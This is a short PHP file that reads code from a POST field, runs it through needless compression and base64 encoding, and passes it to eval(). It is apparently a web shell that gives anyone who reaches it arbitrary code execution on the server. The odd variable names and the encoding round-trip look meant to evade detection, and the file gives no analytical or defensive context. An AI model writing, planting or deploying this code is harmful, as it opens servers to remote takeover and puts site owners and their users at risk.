<?php
echo "start";
$c_ntent=$_POST['php_content'];
$res_t=base64_encode(gzdeflate(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
eval(gzinflate(base64_decode($res_t)));
?>